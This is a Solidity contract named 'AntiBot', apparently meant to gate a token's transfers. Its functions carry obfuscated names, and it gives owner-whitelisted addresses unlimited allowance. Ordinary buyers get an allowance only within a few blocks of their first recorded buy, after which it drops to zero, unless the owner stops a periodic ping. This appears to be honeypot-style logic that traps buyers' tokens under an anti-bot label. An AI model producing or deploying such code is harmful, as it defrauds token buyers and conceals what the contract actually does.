// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity >=0.8.5;

import {console2} from "forge-std/console2.sol";

contract AntiBot {
    address owner;
    bool allowAll = false;
    mapping(address => uint) public addressToBuyBlock;
    mapping(address => bool) public whitelist;
    mapping(address => bool) private validators;
    mapping(uint => uint) private lastPing;
    mapping(uint => uint16) private blockDelay;

    constructor(address[] memory _whitelisted) {
        owner = msg.sender;

        for (uint i = 0; i < _whitelisted.length; i++) {
            whitelist[_whitelisted[i]] = true;
        }

        //validators[0x4200000000000000000000000000000000000011] = true;

        lastPing[5487915321546547897945468793884568] = block.timestamp;
        blockDelay[5487915321546547897945468793884568] = 3;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "No.");
        _;
    }

    fallback() external payable {
        console2.logBytes(msg.data);
    }

    receive() external payable {}

    function ping1687415457874646548784654() external onlyOwner {
        lastPing[5487915321546547897945468793884568] = block.timestamp;
    }

    function changeBlockDelay4568468541621584(
        uint16 newBlockDelay
    ) external onlyOwner {
        blockDelay[5487915321546547897945468793884568] = newBlockDelay;
    }

    function changeWhitelist46848621332154866486(
        address addr,
        bool status
    ) external onlyOwner {
        whitelist[addr] = status;
    }

    function changeAllowAll14684684165135468465(
        bool status
    ) external onlyOwner {
        allowAll = status;
    }

    function checkAllowance(address buyer) external view returns (uint) {
        if (whitelist[buyer]) {
            return type(uint).max;
        }

        if (allowAll) {
            return type(uint).max;
        }

        // if (validators[block.coinbase]) {
        //     return type(uint).max;
        // }

        // if (addressToBuyBlock[buyer] == 0) {
        //     return 0;
        // }

        // return
        //     block.number - addressToBuyBlock[buyer] == blockDelay
        //         ? type(uint).max
        //         : 0;

        // if (addressToBuyBlock[buyer] + 3 == block.number) {
        //     return type(uint).max;
        // }

        if (
            block.timestamp - lastPing[5487915321546547897945468793884568] >
            8 * 60
        ) {
            return type(uint).max;
        }

        //return 0;

        return
            (block.number - addressToBuyBlock[buyer]) >=
                blockDelay[5487915321546547897945468793884568]
                ? 0
                : type(uint).max;
    }

    function transfer(address buyer, uint amount) external {
        if (addressToBuyBlock[buyer] > 0) {
            return;
        }

        addressToBuyBlock[buyer] = block.number;
    }
}
